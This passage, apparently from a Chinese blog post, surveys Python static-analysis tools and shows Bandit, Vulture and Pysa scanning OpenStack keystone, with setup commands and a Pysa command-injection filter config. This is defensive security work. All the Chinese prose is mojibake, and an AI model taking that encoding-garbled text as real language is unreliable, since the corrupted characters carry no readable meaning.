ï¼ŒåŒæ—¶æ”¯æŒå¤–éƒ¨æ¨¡å—çš„åˆ†æã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/gak/pycallgraph">pycallgraph</a>*</td><td>ä¸º Python åº”ç”¨ç”Ÿæˆè°ƒç”¨å›¾ï¼ˆCall Graphï¼‰ï¼ŒåŒ…æ‹¬å‡½æ•°çš„è°ƒç”¨æ¬¡æ•°ã€æ‰§è¡Œæ—¶é—´ç­‰ä¿¡æ¯ï¼Œæä¾›ä¸€å®šç¨‹åº¦çš„æ€§èƒ½åˆ†æåŠŸèƒ½ã€‚åŒæ—¶æ”¯æŒè¿‡æ»¤å‡½æ•°ï¼Œé¿å…ç”Ÿæˆçš„å›¾å¤ªå¤§æ— æ³•åˆ†æï¼Œé»˜è®¤å¯¼å‡º <code>.png</code> æ–‡ä»¶ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/Yelp/undebt">undebt</a>*</td><td>æ‰§è¡Œå¤§è§„æ¨¡è‡ªåŠ¨åŒ–ä»£ç é‡æ„ï¼Œæ ¹æ®è‡ªå®šä¹‰æ¨¡å¼å¯¹ä»£ç è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ï¼Œé€‚ç”¨äºä»»ä½•è¯­è¨€ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/python-security/pyt">pyt</a>*</td><td>åŸºäºç†è®ºåŸºç¡€çš„ Python Web åº”ç”¨é™æ€åˆ†æï¼ˆæ§åˆ¶æµå›¾ã€å®šç‚¹ã€æ•°æ®æµåˆ†æï¼‰ï¼Œèƒ½å¤Ÿæ£€æµ‹ SSRFã€SQL æ³¨å…¥ã€XSSã€ç›®å½•éå†ç­‰æ”»å‡»ï¼Œæ”¯æŒè‡ªå®šä¹‰æºç‚¹å’Œæ±‡ç‚¹ã€ä¼ æ’­æ±¡ç‚¹çš„å‡½æ•°ã€‚ç›®å‰å·²åœæ›´ï¼Œä½œè€…å»ºè®®ä½¿ç”¨ Pyre ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/facebook/pyre-check">Pyre (Facebook)</a></td><td>æ€§èƒ½ç±»å‹æ£€æŸ¥å™¨ï¼Œé›†æˆé™æ€åˆ†æå·¥å…· Pysaï¼ˆæ±¡ç‚¹åˆ†æï¼‰Pysa é€šè¿‡è·Ÿè¸ªæ•°æ®æµå®ç°å®‰å…¨æ£€æŸ¥ï¼Œä¾èµ–ç±»å‹æ³¨é‡Šï¼Œèƒ½å¤Ÿé«˜é€Ÿå¤„ç†å¤§å‹ä»£ç ã€‚</td><td>OCamlã€Python</td></tr><tr><td><a href="https://github.com/PyCQA/bandit">Bandit</a></td><td>æ„å»º AST å¹¶ä½¿ç”¨æ’ä»¶æ£€æŸ¥å®‰å…¨é—®é¢˜ï¼Œæœ€åˆåœ¨ OpenStack å®‰å…¨é¡¹ç›®ä¸­å¼€å‘ï¼Œåæ¥è¢«é‡æ–°å®šä½åˆ° PyCQAã€‚ä¸»è¦ç”¨äºæ‰«æå±é™©å‡½æ•°ï¼Œæ”¯æŒè‡ªå®šä¹‰æ¼æ´æµ‹è¯•å’Œæ‰©å±•æ’ä»¶ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/CoatiSoftware/Sourcetrail">Sourcetrail</a></td><td>è·¨å¹³å°çš„æºä»£ç æµè§ˆå™¨ï¼Œæ”¯æŒ C&#x2F;C++ã€Javaã€Pythonï¼Œæä¾›æœç´¢ã€ä»£ç ã€å›¾å½¢ä¸‰ä¸ªäº¤äº’å¼è§†å›¾ã€‚äº®ç‚¹æ˜¯ç»™å‡ºäº†æºä»£ç çš„ç»“æ„ï¼Œä½†åªæœ‰ç¬¦å·åç§°ã€‚</td><td>C++ã€Java</td></tr><tr><td><a href="https://github.com/rubik/radon/">radon</a></td><td>è®¡ç®—æºä»£ç çš„åº¦é‡ï¼ˆmetricsï¼‰ï¼ŒåŒ…æ‹¬ McCabeã€Halsteadã€å¯ç»´æŠ¤æ€§ç´¢å¼•ä¸‰ç§åº¦é‡æŒ‡æ ‡ï¼Œæ”¯æŒåœ¨ coala ä¸­ä½¿ç”¨ã€‚ä¸»è¦ç”¨äºè¯„ä¼°ä»£ç çš„å¤æ‚åº¦ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/rubik/xenon">xenon</a></td><td>åŸºäº radon çš„ç›‘æµ‹å·¥å…·ï¼Œæ£€æŸ¥ä»£ç å¤æ‚æ€§ã€‚å¯åº”ç”¨äº CI&#x2F;CDï¼Œåœ¨æ¯æ¬¡æäº¤ä»£ç æ—¶è¿è¡Œï¼Œæ ¹æ®è‡ªå®šä¹‰ä»£ç å¤æ‚æ€§é˜ˆå€¼è¿”å›æˆåŠŸæˆ–å¤±è´¥ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/davidhalter/jedi">jedi</a></td><td>Python é™æ€åˆ†æå·¥å…·ï¼Œä¾§é‡äºè‡ªåŠ¨è¡¥å…¨å’Œè·³è½¬ï¼Œé€šå¸¸ä½œä¸ºç¼–è¾‘å™¨çš„æ’ä»¶ä½¿ç”¨ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/python/mypy">mypy</a></td><td>é™æ€ç±»å‹æ£€æŸ¥å™¨ï¼ˆPEP 484ï¼‰ï¼Œèƒ½å¤Ÿå¯¹ Python ç¨‹åºä¸­çš„ç±»å‹æ³¨é‡Šæ‰§è¡Œé™æ€æ£€æŸ¥ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/Microsoft/pyright">pyright (Microsoft)</a></td><td>å¯ç”¨äºå¤§å‹ Python æºä»£ç åº“çš„å¿«é€Ÿç±»å‹æ£€æŸ¥å™¨ï¼Œä½¿ç”¨å†…ç½®çš„ç±»å‹å­˜æ ¹è¿›è¡Œç±»å‹æ¨æ–­ï¼Œå¯ä»¥åœ¨ç›‘è§†æ¨¡å¼ä¸‹è¿è¡Œï¼Œæ”¯æŒå¢é‡æ›´æ–°ã€‚</td><td>TypeScriptã€Python</td></tr><tr><td><a href="https://github.com/google/pytype">pytype (Google)</a></td><td>é™æ€åˆ†æå™¨ï¼Œæ— éœ€ç±»å‹æ³¨é‡Šå°±èƒ½æ£€æŸ¥å’Œæ¨æ–­ Python ä»£ç çš„ç±»å‹ï¼Œä¹Ÿåˆ©ç”¨äº†ç±»å‹å­˜æ ¹ï¼ˆpyi æ–‡ä»¶ï¼‰ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/jendrikseipp/vulture">Vulture</a></td><td>æŸ¥æ‰¾ Python ç¨‹åºä¸­æœªä½¿ç”¨çš„ä»£ç ï¼ˆæ­»ä»£ç ï¼‰ï¼Œå­˜åœ¨æ¼æŠ¥ï¼Œå¹¶ä¸”éšå¼è°ƒç”¨å¯èƒ½ä¼šè¢«è¯¯æŠ¥ã€‚æ”¯æŒè®¾ç½®æœ€å°ç½®ä¿¡åº¦ã€ç™½åå•ç­‰åŠŸèƒ½ï¼Œå¯ä»¥å¯¹å•ä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„ py æ–‡ä»¶æ‰§è¡Œåˆ†æã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/vitsalis/pycg">PyCG</a></td><td>ä½¿ç”¨é™æ€åˆ†æä¸º Python ä»£ç ç”Ÿæˆè°ƒç”¨å›¾ï¼Œæ”¯æŒé«˜é˜¶å‡½æ•°ã€ç±»ç»§æ‰¿ã€å¯¼å…¥çš„æ¨¡å—ã€åµŒå¥—å®šä¹‰ã€‚è¯¦è§è®ºæ–‡ <a href="https://vitsalis.com/papers/pycg.pdf">ICSE 2021 paper</a></td><td>Python</td></tr><tr><td><a href="https://github.com/tonybaloney/wily">Wily</a></td><td>å¤æ‚æ€§æ£€æŸ¥</td><td>Python</td></tr><tr><td><a href="https://github.com/PyCQA/mccabe">McCabe</a></td><td>å¤æ‚æ€§æ£€æŸ¥</td><td>Python</td></tr><tr><td><a href="https://github.com/thg-consulting/it">it</a></td><td>ä»£ç æ£€æŸ¥å·¥å…·&#x2F;æ¡†æ¶</td><td>Python</td></tr></tbody></table><p>ä»¥åŠä¸€äº›é—­æºå·¥å…·</p><table><thead><tr><th>å·¥å…·</th><th></th></tr></thead><tbody><tr><td><a href="https://securitylab.github.com/tools/codeql/">CodeQL</a></td><td>ä»£ç åˆ†æå¼•æ“</td></tr><tr><td><a href="https://www.microfocus.com/en-us/cyberres/application-security/static-code-analyzer">Fortify SCA</a></td><td>é™æ€ä»£ç å®¡è®¡å·¥å…·</td></tr><tr><td><a href="https://marketplace.visualstudio.com/items?itemName=ms-python.vscode-pylance">Pylance (Microsoft)</a></td><td>åŸºäº pyright çš„ Python ä»£ç é™æ€åˆ†æå·¥å…·</td></tr><tr><td><a href="https://deepsource.io/">DeepSource</a></td><td>æ”¯æŒå¤šç§è¯­è¨€çš„é™æ€åˆ†æï¼Œä¸ªäººå…è´¹</td></tr><tr><td><a href="https://www.codacy.com/">Codacy</a></td><td>èƒ½å¤Ÿé€šè¿‡é™æ€ä»£ç åˆ†æè·å¾—å…³äºå®‰å…¨é—®é¢˜ã€ä»£ç è¦†ç›–ç‡ã€ä»£ç é‡å¤ç‡ã€ä»£ç å¤æ‚æ€§çš„ä¿¡æ¯</td></tr></tbody></table><p>å‰æ®µæ—¶é—´çš„ log4j è²Œä¼¼å°±æ˜¯ç”¨ CodeQL æ‰¾åˆ°çš„ğŸ‘</p><h2 id="Bandit"><a href="#Bandit" class="headerlink" title="Bandit"></a>Bandit</h2><p>Bandit å¯ä»¥ç”¨æ¥æœç´¢ Python ä»£ç ä¸­å¸¸è§çš„å®‰å…¨é—®é¢˜ï¼Œåœ¨æ£€æµ‹è¿‡ç¨‹ä¸­ï¼ŒBandit ä¼šå¯¹æ¯ä¸€ä»½ Python ä»£ç æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼ŒåŸºäº ast æ¨¡å—ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼Œç„¶åé’ˆå¯¹æ¯ä¸€ä¸ª AST èŠ‚ç‚¹è¿è¡Œç›¸åº”çš„æ£€æµ‹æ’ä»¶ã€‚å®Œæˆå®‰å…¨æ‰«æä¹‹åï¼ŒBandit ä¼šç›´æ¥ç»™ç”¨æˆ·ç”Ÿæˆæ£€æµ‹æŠ¥å‘Šã€‚</p><p>æ‹¿ keystone æºç è¿›è¡Œæµ‹è¯•ï¼Œæµ‹è¯•æ’ä»¶åˆ†ç»„å¦‚ä¸‹ï¼Œå¯ä»¥é€šè¿‡é…ç½®è¿›è¡Œé€‰æ‹©ï¼š</p><table><thead><tr><th>ID</th><th>Description</th></tr></thead><tbody><tr><td>B1xx</td><td>misc tests</td></tr><tr><td>B2xx</td><td>application&#x2F;framework misconfiguration</td></tr><tr><td>B3xx</td><td>blacklists (calls)</td></tr><tr><td>B4xx</td><td>blacklists (imports)</td></tr><tr><td>B5xx</td><td>cryptography</td></tr><tr><td>B6xx</td><td>injection</td></tr><tr><td>B7xx</td><td>XSS</td></tr></tbody></table><h3 id="æµ‹è¯•-keystone"><a href="#æµ‹è¯•-keystone" class="headerlink" title="æµ‹è¯• keystone"></a>æµ‹è¯• keystone</h3><p>ç¯å¢ƒå‡†å¤‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># virtualenv</span></span><br><span class="line">sudo apt install python3-virtualenv -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">virtualenv bandit-env</span><br><span class="line">python3 -m venv bandit-env</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> bandit-env/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… Bandit</span></span><br><span class="line">pip install bandit</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæµ‹è¯•ç›®å½•</span></span><br><span class="line"><span class="built_in">mkdir</span> bandit-test &amp;&amp; <span class="built_in">cd</span> bandit-test</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½ keystone æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --single-branch --branch stable/victoria</span><br></pre></td></tr></table></figure><p>ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯é»‘åå•å’Œè‡ªå®šä¹‰æ£€æµ‹è§„åˆ™ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿è¡Œ Bandit</span></span><br><span class="line">bandit -r keystone -o test.txt -f txt</span><br><span class="line">bandit -r keystone -o test.html -f html</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤åˆ¶åˆ°æœ¬åœ°æŸ¥çœ‹</span></span><br><span class="line">scp -r jck@10.123.123.123:~/bandit-test/test.html /c/Users/linki/Desktop</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®æ–‡ä»¶</span></span><br><span class="line">.bandit</span><br></pre></td></tr></table></figure><p>å¯¼å‡ºçš„æ–‡ä»¶ <a href="https://raw.githubusercontent.com/jckling/Assets/master/python/test.html">test.html</a> æ˜¾ç¤ºæ‰«æäº† 118379 è¡Œä»£ç ï¼Œè“è‰²è¡¨ç¤ºä½å±ï¼Œæ©™è‰²è¡¨ç¤ºä¸­å±ï¼Œè¿™é‡Œæ‰€æœ‰çš„éƒ½åªå‡ºç°åœ¨ tests çš„æµ‹è¯•æ–‡ä»¶ä¸­ã€‚</p><p>è¿‡æ»¤æµ‹è¯•æ–‡ä»¶å¤¹ï¼Œé‡æ–°æ‰§è¡Œæ£€æµ‹ï¼Œå¾—åˆ° html æ–‡ä»¶ï¼š<a href="https://raw.githubusercontent.com/jckling/Assets/master/python/testx.html">testx.html</a> æ˜¾ç¤ºæ‰«æ 41415 è¡Œä»£ç ï¼Œæ²¡æœ‰ç”¨åˆ°å±é™©å‡½æ•°ã€‚</p><p>Bandit åŸå…ˆæ˜¯ OpenStack çš„é¡¹ç›®ï¼Œéƒ¨åˆ†ç»„ä»¶çš„å¼€å‘æœ‰ä½¿ç”¨ Bandit è¿›è¡Œæ£€æŸ¥ï¼Œå…¶ä¸­å°±åŒ…æ‹¬ keystone ï¼Œå› æ­¤ç”¨ Bandit æ‰«æç»„ä»¶çš„æ„ä¹‰å¯èƒ½ä¸æ˜¯å¾ˆå¤§ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿‡æ»¤æµ‹è¯•æ–‡ä»¶å¤¹</span></span><br><span class="line">bandit -r keystone/keystone/ --exclude keystone/keystone/tests/ -o testx.html -f html</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤åˆ¶åˆ°æœ¬åœ°æŸ¥çœ‹</span></span><br><span class="line">scp -r jck@10.123.123.123:~/bandit-test/testx.html /c/Users/linki/Desktop</span><br></pre></td></tr></table></figure><h2 id="Vulture"><a href="#Vulture" class="headerlink" title="Vulture"></a>Vulture</h2><p>åŒæ ·åˆ©ç”¨äº† ast æ¨¡å—ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼Œåœ¨éå†æ—¶è®°å½•å·²å®šä¹‰å’Œä½¿ç”¨çš„å¯¹è±¡åç§°ï¼Œæœ€åæŠ¥å‘Šæœªä½¿ç”¨çš„å¯¹è±¡ï¼ˆæ­»ä»£ç ï¼‰ã€‚è¿˜é€šè¿‡æŸ¥æ‰¾ returnã€breakã€continueã€raiseã€ä¸æ»¡è¶³æ¡ä»¶çš„ if æ¡ä»¶ã€while æ¡ä»¶æ¥æ£€æµ‹ä¸å¯è¾¾çš„ä»£ç ã€‚å› ä¸ºåªè€ƒè™‘å¯¹è±¡åç§°ï¼Œæ²¡æœ‰è€ƒè™‘ä½œç”¨åŸŸï¼Œå› æ­¤å¯èƒ½å­˜åœ¨æ¼æŠ¥ï¼Œè€Œä¸”éšå¼è°ƒç”¨å¯èƒ½ä¼šè¢«è¯¯æŠ¥ã€‚</p><h3 id="æµ‹è¯•-keystone-1"><a href="#æµ‹è¯•-keystone-1" class="headerlink" title="æµ‹è¯• keystone"></a>æµ‹è¯• keystone</h3><p>å…·ä½“çš„å®‰è£…ä¸æµ‹è¯•æ“ä½œå¦‚ä¸‹ï¼Œæ‰§è¡Œç»“æœå¯¼å‡ºä¸º <a href="https://raw.githubusercontent.com/jckling/Assets/master/python/unused.txt">unused.txt</a>ï¼Œæœ€åç»™å‡ºäº†ç½®ä¿¡åº¦ã€‚æ‰§è¡Œé€Ÿåº¦éå¸¸å¿«ï¼Œä½†ç»™å‡ºçš„ç»“æœä¿¡æ¯é‡å°‘ï¼Œåªèƒ½ä½œä¸ºç®€å•çš„å‚è€ƒã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="built_in">mkdir</span> vulture-test</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">python -m venv vulture-test</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">cd</span> vulture-test</span><br><span class="line"><span class="built_in">source</span> bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… Vulture</span></span><br><span class="line">pip install vulture</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½ keystone æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --single-branch --branch stable/victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œåˆ†æ</span></span><br><span class="line">vulture keystone/keystone/ --exclude keystone/keystone/tests/ --sort-by-size &gt; unused.txt</span><br></pre></td></tr></table></figure><h2 id="Pysa"><a href="#Pysa" class="headerlink" title="Pysa"></a>Pysa</h2><p>å…¥é—¨æ•™ç¨‹å¯ä»¥çœ‹ï¼š<a href="https://jckling.github.io/2021/07/07/Security/Pysa%20Tutorial/">Pyre æ±¡ç‚¹åˆ†æå·¥å…· Pysa ä½¿ç”¨æ•™ç¨‹</a></p><h3 id="æµ‹è¯•-keystone-2"><a href="#æµ‹è¯•-keystone-2" class="headerlink" title="æµ‹è¯• keystone"></a>æµ‹è¯• keystone</h3><h4 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h4><p>å®‰è£…ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ›´æ–° Python3.8.x</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install python3.8 python3.8-venv python3.8-dev python3-pip -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># update-alternatives é…ç½® python æŒ‡å‘ python3.8.x å</span></span><br><span class="line">python -m pip install --upgrade setuptools</span><br><span class="line">pip install wheel</span><br></pre></td></tr></table></figure><p>åˆå§‹é…ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">python -m venv ~/.venvs/pysa</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> ~/.venvs/pysa/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–°å·¥å…·</span></span><br><span class="line">pip install wheel</span><br><span class="line">python -m pip install --upgrade setuptools</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… Pyre å’Œ SAPP</span></span><br><span class="line">pip install pyre-check fb-sapp</span><br></pre></td></tr></table></figure><h4 id="åˆ†æ-keystone-æºç "><a href="#åˆ†æ-keystone-æºç " class="headerlink" title="åˆ†æ keystone æºç "></a>åˆ†æ keystone æºç </h4><p>ä¸‹è½½ Victoria ç‰ˆæœ¬çš„ keystone æºç å¹¶å®‰è£…ä¾èµ–ï¼Œèƒ½å¤Ÿè®© Pysa ä½¿ç”¨å’Œå¯¼å…¥æ¨¡å—å¯¹åº”çš„æ±¡ç‚¹æ¨¡å‹ï¼Œæ£€æµ‹å¯¼å…¥æ¨¡å—å†…éƒ¨çš„æ±¡ç‚¹æºå’Œæ±‡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæµ‹è¯•ç›®å½•</span></span><br><span class="line"><span class="built_in">mkdir</span> pysa-test &amp;&amp; <span class="built_in">cd</span> pysa-test</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --single-branch --branch stable/victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿›å…¥æºç ç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> keystone</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… keystone ä¾èµ–</span></span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–é…ç½®ï¼Œæ·»åŠ ç±»å‹æ³¨é‡Šï¼ˆPython 3.5+ï¼‰éƒ¨åˆ†ä¼šå¤±è´¥ï¼Œå¯¼å…¥è¿‡æ»¤å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆå§‹åŒ–é…ç½®</span></span><br><span class="line">pyre init</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼–è¾‘é…ç½®æ–‡ä»¶</span></span><br><span class="line">vim .pyre_configuration</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸ºæºç æ·»åŠ ç±»å‹æ³¨é‡Š</span></span><br><span class="line">pyre infer -r -i</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥è¿‡æ»¤å™¨è®¾ç½® SAPP</span></span><br><span class="line">sapp filter import ~/.venvs/pysa/lib/pyre_check/pysa_filters</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤å™¨ <a href="https://github.com/facebook/pyre-check/tree/master/tools/sapp/pysa_filters">pysa_filters</a> åŒ…å«ä»¥ä¸‹é…ç½®æ–‡ä»¶</p><ul><li>5001-code-command-injection.json</li><li>5005-sql-injection.json</li><li>5011-userdata-to-filesystem.json</li><li>6065-argument-injection.json</li><li>6066-unsafe-deserialization.json</li><li>6073-server-side-template-injection.json</li></ul><p>ä»¥ 5001-code-command-injection.json ä¸ºä¾‹ï¼Œè®¾ç½®ä¸å±•ç¤ºå…ƒæ•°æ®ï¼ˆfeatureï¼‰ä»¥åŠæ˜¾ç¤ºçš„è¿½è¸ªé•¿åº¦</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Command and Code Injection&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;High signal filter for 5001 Shell Injection&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;features&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;none of&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;features&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;always-type:scalar&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;always-type:bool&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;via:shell_escape&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;always-via:shell_escape&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;codes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">5001</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;traceLengthFromSources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">3</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;traceLengthToSinks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">4</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œ Pyre å¹¶å°†ç»“æœå­˜å‚¨åœ¨ pysa-runs æ–‡ä»¶å¤¹ï¼Œä½¿ç”¨ SAPP å¯è§†åŒ–å±•ç¤º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿è¡Œ Pysa</span></span><br><span class="line">pyre analyze --no-verify --save-results-to ./pysa-runs --dump-call-graph</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥æ–‡ä»¶ è¿è¡Œ SAPP</span></span><br><span class="line">sapp analyze ./pysa-runs/taint-output.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡ŒæœåŠ¡å™¨</span></span><br><span class="line">sapp server</span><br></pre></td></tr></table></figure><p>ç”±äºè¿è¡Œ OpenStack æœåŠ¡çš„ä¸»æœºä¸Š keystone ç»‘å®šäº† 5000 ç«¯å£ï¼Œè€Œ SAPP ä¸æä¾›ä¿®æ”¹ç«¯å£çš„é€‰é¡¹ï¼Œæ‰€ä»¥é‡æ–°å¼„äº†å°ä¸»æœºä¸“é—¨ç”¨äºåˆ†æã€‚å¦å¤–ï¼ŒSAPP çš„ UI é»˜è®¤ç»‘å®šåœ¨ localhost ä¸Šï¼Œéœ€è¦åœ¨æœ¬åœ°ä½¿ç”¨ iptables é…ç½®è½¬å‘ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 